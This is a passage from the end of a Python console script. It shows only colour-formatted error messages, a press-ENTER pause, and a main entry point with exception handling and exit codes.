            print(f'\n  {LRED}✗{RESET_ALL} Unexpected error: {error}')
            input(f'\n  {LBLACK}[Press ENTER]{RESET_ALL}')
    sys.exit(0)
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        print(f'{LRED}Fatal error: {e}{RESET_ALL}')
        sys.exit(1)